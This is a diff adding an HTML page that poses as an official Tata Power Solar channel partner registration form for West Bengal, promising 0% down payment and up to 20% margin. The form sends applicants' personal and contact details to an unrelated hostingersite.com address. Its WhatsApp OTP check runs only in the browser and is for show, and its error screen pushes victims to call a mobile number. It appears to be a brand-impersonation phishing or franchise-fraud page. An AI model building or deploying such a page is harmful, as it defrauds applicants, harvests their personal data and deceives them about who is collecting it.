@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tata Power Solar - Channel Partner Application Form</title>
+    <style>
+        /* Tata Power Solar Official Brand Color Palette */
+        :root {
+            --tata-blue: #095397;
+            --tata-dark-blue: #1467b4;
+            --solar-orange: #1467b46e;
+            --solar-amber: #ffc107;
+            --bg-gray: #f8fafc;
+            --card-border: #e2e8f0;
+            --text-main: #0f172a;
+            --text-muted: #475569;
+            --whatsapp-green: #25D366;
+            --success-green: #16a34a;
+            --error-red: #c8240b;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-gray);
+            color: var(--text-main);
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 750px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            border: 1px solid var(--card-border);
+        }
+
+        /* Top Header Card */
+        .header-card {
+            background: #ffffff;
+            border-top: 6px solid var(--tata-blue);
+            padding: 24px;
+            border-bottom: 1px solid var(--card-border);
+        }
+
+        .brand-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .official-badge {
+            background-color: #eef6ff;
+            color: var(--tata-blue);
+            border: 1px solid #bce0fd;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .doc-title {
+            color: var(--text-main);
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .doc-subtitle {
+            color: var(--text-muted);
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+
+        .highlight-banner {
+            background: linear-gradient(135deg, var(--tata-blue) 0%, var(--tata-dark-blue) 100%);
+            color: #ffffff;
+            padding: 14px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-around;
+            text-align: center;
+        }
+
+        .highlight-item {
+            flex: 1;
+        }
+
+        .highlight-item:not(:last-child) {
+            border-right: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .highlight-val {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--solar-amber);
+        }
+
+        .highlight-lbl {
+            font-size: 11px;
+            color: #e2e8f0;
+            text-transform: uppercase;
+        }
+
+        /* Section Cards */
+        .section-card {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--card-border);
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--tata-blue);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 14px;
+            padding-bottom: 6px;
+            border-bottom: 2px solid var(--bg-gray);
+        }
+
+        .form-row {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 14px;
+        }
+
+        .form-group {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        label {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+
+        .req {
+            color: #2878e1;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #cbd5e1;
+            background-color: var(--bg-gray);
+            border-radius: 6px;
+            font-size: 13px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus,
+        textarea:focus,
+        select:focus {
+            border-color: var(--tata-blue);
+            background-color: #ffffff;
+        }
+
+        /* Verification Styles */
+        .input-with-btn {
+            display: flex;
+            gap: 8px;
+        }
+
+        .btn-verify {
+            background-color: var(--whatsapp-green);
+            color: white;
+            border: none;
+            padding: 0 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-verify:hover {
+            background-color: #1eb954;
+        }
+
+        .verified-badge {
+            display: none;
+            color: var(--success-green);
+            font-size: 12px;
+            font-weight: 700;
+            align-items: center;
+            gap: 4px;
+            margin-top: 6px;
+        }
+
+        .otp-box {
+            display: none;
+            background: #f0fdf4;
+            border: 1px dashed var(--whatsapp-green);
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 10px;
+        }
+
+        .otp-box p {
+            font-size: 12px;
+            color: #166534;
+            margin-bottom: 8px;
+        }
+
+        .otp-input-group {
+            display: flex;
+            gap: 8px;
+        }
+
+        .btn-otp-submit {
+            background-color: var(--tata-blue);
+            color: white;
+            border: none;
+            padding: 0 16px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .option-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 4px;
+        }
+
+        .option-label {
+            font-size: 13px;
+            font-weight: normal;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        /* Action Button */
+        .btn-container {
+            padding: 24px;
+            text-align: center;
+        }
+
+        .btn-submit {
+            background-color: var(--solar-orange);
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 15px;
+            padding: 12px 36px;
+            border: none;
+            border-radius: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(245, 124, 0, 0.3);
+            transition: all 0.2s;
+        }
+
+        .btn-submit:disabled {
+            background-color: #cbd5e1;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-submit:not(:disabled):hover {
+            background-color: #e06d00;
+        }
+
+        .footer-notice {
+            text-align: center;
+            font-size: 11px;
+            color: var(--text-muted);
+            padding: 0 24px 20px 24px;
+            line-height: 1.5;
+        }
+
+        /* Error Overlay Screen Modal */
+        .error-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(15, 23, 42, 0.85);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .error-modal {
+            background-color: #ffffff;
+            border-radius: 12px;
+            max-width: 480px;
+            width: 100%;
+            padding: 24px;
+            text-align: center;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
+            border-top: 6px solid var(--error-red);
+            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .error-images-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .error-img-top {
+            max-height: 45px;
+            object-fit: contain;
+        }
+
+        .error-img-bottom {
+            width: 100%;
+            max-height: 220px;
+            object-fit: contain;
+            border-radius: 8px;
+        }
+
+        .error-title {
+            color: var(--error-red);
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .error-desc {
+            color: var(--text-muted);
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .btn-retry {
+            background-color: var(--error-red);
+            color: #ffffff;
+            border: none;
+            padding: 10px 28px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-retry:hover {
+            background-color: #1467b4;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="form-container">
+
+        <!-- Header Section -->
+        <div class="header-card">
+            <div class="brand-header">
+                <img class="logo-svg"
+                    src="https://www.amplesolar.in/wp-content/uploads/2025/06/tata-solar-rooftop-gandhinagar-amplesolar.png"
+                    alt="Tata Power Solar" height="40">
+                <span class="official-badge">Official Application</span>
+            </div>
+
+            <div class="doc-title">Channel Partner Registration Form</div>
+            <div class="doc-subtitle">West Bengal Network Expansion Drive | Government Registered Franchise Program</div>
+
+            <div class="highlight-banner">
+                <div class="highlight-item">
+                    <div class="highlight-val">0%</div>
+                    <div class="highlight-lbl">Down Payment</div>
+                </div>
+                <div class="highlight-item">
+                    <div class="highlight-val">Up to 20%</div>
+                    <div class="highlight-lbl">Profit Margin</div>
+                </div>
+                <div class="highlight-item">
+                    <div class="highlight-val">100%</div>
+                    <div class="highlight-lbl">Brand Support</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <form id="partnerForm" action="https://firebrick-loris-550713.hostingersite.com/submit.php" method="POST">
+            <!-- Section 1: Personal & Business Contact -->
+            <div class="section-card">
+                <div class="section-title">1. Applicant Details</div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Full Name <span class="req">*</span></label>
+                        <input type="text" name="full_name" placeholder="Enter your full name" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Primary Phone Number <span class="req">*</span></label>
+                        <input type="tel" id="phone" name="phone" placeholder="Enter 10-digit mobile number" maxlength="10" required>
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>WhatsApp Number <span class="req">*</span></label>
+                        <div class="input-with-btn">
+                            <input type="tel" id="whatsapp" name="whatsapp" placeholder="Enter WhatsApp number" maxlength="10" required>
+                            <button type="button" id="sendOtpBtn" class="btn-verify" onclick="initiateWhatsAppVerification()">
+                                Send OTP
+                            </button>
+                        </div>
+                        
+                        <!-- Verified Badge -->
+                        <div id="verifiedBadge" class="verified-badge">
+                            ✓ WhatsApp Number Verified
+                        </div>
+
+                        <!-- OTP Box -->
+                        <div id="otpBox" class="otp-box">
+                            <p>Enter the 6-digit verification code generated for your WhatsApp:</p>
+                            <div class="otp-input-group">
+                                <input type="text" id="otpInput" maxlength="6" placeholder="ENTER OTP">
+                                <button type="button" class="btn-otp-submit" onclick="verifyOtp()">Verify</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Email Address <span class="req">*</span></label>
+                        <input type="email" name="email" placeholder="example@domain.com" required>
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>District & Location in West Bengal <span class="req">*</span></label>
+                        <input type="text" name="district" placeholder="e.g. Purba Medinipur, Kolkata, Howrah" required>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 2: Business & Background Profile -->
+            <div class="section-card">
+                <div class="section-title">2. Business Profile & Qualification</div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Current Profession / Business Background <span class="req">*</span></label>
+                        <div class="option-group">
+                            <label class="option-label"><input type="checkbox" name="profession[]" value="Electrical/Technical Shop Owner"> Electrical / Technical Shop Owner</label>
+                            <label class="option-label"><input type="checkbox" name="profession[]" value="Certified Electrician"> Certified / Experienced Electrician</label>
+                            <label class="option-label"><input type="checkbox" name="profession[]" value="Solar/Renewable Energy Sector"> Solar / Renewable Energy Sector</label>
+                            <label class="option-label"><input type="checkbox" name="profession[]" value="Engineering/Technical"> Engineering / Technical Background</label>
+                            <label class="option-label"><input type="checkbox" name="profession[]" value="Entrepreneur/Business Owner"> Entrepreneur / Business Owner</label>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Do you own a shop/office in a main market area? <span class="req">*</span></label>
+                        <div class="option-group">
+                            <label class="option-label"><input type="radio" name="has_shop" value="Commercial Shop/Office Owned" required> Yes, Commercial Shop/Office Owned</label>
+                            <label class="option-label"><input type="radio" name="has_shop" value="Commercial Shop/Office Rented"> Yes, Commercial Shop/Office Rented</label>
+                            <label class="option-label"><input type="radio" name="has_shop" value="Operating Individually"> No, Operating Individually</label>
+                        </div>
+
+                        <label style="margin-top: 15px;">Years of Relevant Experience <span class="req">*</span></label>
+                        <select name="experience" required>
+                            <option value="">Select Experience</option>
+                            <option value="0-2">0 - 2 Years</option>
+                            <option value="3-5">3 - 5 Years</option>
+                            <option value="5+">5+ Years</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section 3: Additional Details -->
+            <div class="section-card">
+                <div class="section-title">3. Additional Information</div>
+                <div class="form-group">
+                    <label>Additional Comments / Business Query</label>
+                    <textarea name="comments" rows="3" placeholder="Mention any specific queries or detailed business plan..."></textarea>
+                </div>
+            </div>
+
+            <!-- Action Button -->
+            <div class="btn-container">
+                <button type="submit" id="submitBtn" class="btn-submit" disabled>Submit Application</button>
+            </div>
+        </form>
+
+        <div class="footer-notice">
+            <strong>Tata Power Solar Systems Limited</strong> • Official Channel Partner Onboarding Form<br />
+            Applications are processed in coordination with West Bengal regional representatives.
+        </div>
+
+    </div>
+
+    <!-- Error Screen Modal Overlay -->
+    <div id="errorOverlay" class="error-overlay">
+        <div class="error-modal">
+            <div class="error-images-container">
+                <!-- Top Image -->
+                <img class="error-img-top" src="https://www.amplesolar.in/wp-content/uploads/2025/06/tata-solar-rooftop-gandhinagar-amplesolar.png" alt="Tata Power Solar Logo">
+                <!-- Bottom Image -->
+                <img class="error-img-bottom" alt="Verification Failed Notice Contact us now without delay. 
+Call this number. +91 70016 99081 ">
+            </div>
+            <div class="error-title">Verification / Submission Failed</div>
+            <div class="error-desc">The OTP code entered is incorrect or the verification process was incomplete. Please verify your WhatsApp number to submit the form.</div>
+            <button type="button" class="btn-retry" onclick="closeErrorOverlay()">Try Again</button>
+        </div>
+    </div>
+
+    <!-- WhatsApp Verification Script -->
+    <script>
+        let generatedOtp = null;
+        let isVerified = false;
+
+        function initiateWhatsAppVerification() {
+            const waNumber = document.getElementById('whatsapp').value.trim();
+
+            if (waNumber.length !== 10 || isNaN(waNumber)) {
+                showErrorOverlay("Please enter a valid 10-digit WhatsApp number.");
+                return;
+            }
+
+            // Generate a 6-digit random OTP
+            generatedOtp = Math.floor(100000 + Math.floor(Math.random() * 900000)).toString();
+
+            // Open WhatsApp with pre-filled OTP message
+            const textMessage = encodeURIComponent(`Tata Power Solar Application Verification Code: ${generatedOtp}\n\nPlease enter this code on the form to complete registration.`);
+            const waUrl = `https://wa.me/91${waNumber}?text=${textMessage}`;
+
+            // Open WhatsApp in a new tab
+            window.open(waUrl, '_blank');
+
+            // Show OTP Input Box
+            document.getElementById('otpBox').style.display = 'block';
+            document.getElementById('sendOtpBtn').innerText = 'Resend Code';
+        }
+
+        function verifyOtp() {
+            const userOtp = document.getElementById('otpInput').value.trim();
+
+            if (userOtp === generatedOtp && generatedOtp !== null) {
+                isVerified = true;
+                document.getElementById('otpBox').style.display = 'none';
+                document.getElementById('sendOtpBtn').style.display = 'none';
+                document.getElementById('whatsapp').readOnly = true;
+                
+                // Show Success Badge and Enable Form Submission
+                document.getElementById('verifiedBadge').style.display = 'flex';
+                document.getElementById('submitBtn').disabled = false;
+            } else {
+                // Show High-Quality Error Overlay on Invalid OTP
+                showErrorOverlay("Invalid OTP entered. Verification failed.");
+            }
+        }
+
+        function showErrorOverlay(message) {
+            document.getElementById('errorOverlay').style.display = 'flex';
+        }
+
+        function closeErrorOverlay() {
+            document.getElementById('errorOverlay').style.display = 'none';
+            document.getElementById('otpInput').value = '';
+            document.getElementById('otpInput').focus();
+        }
+    </script>
+</body>
+
+</html>
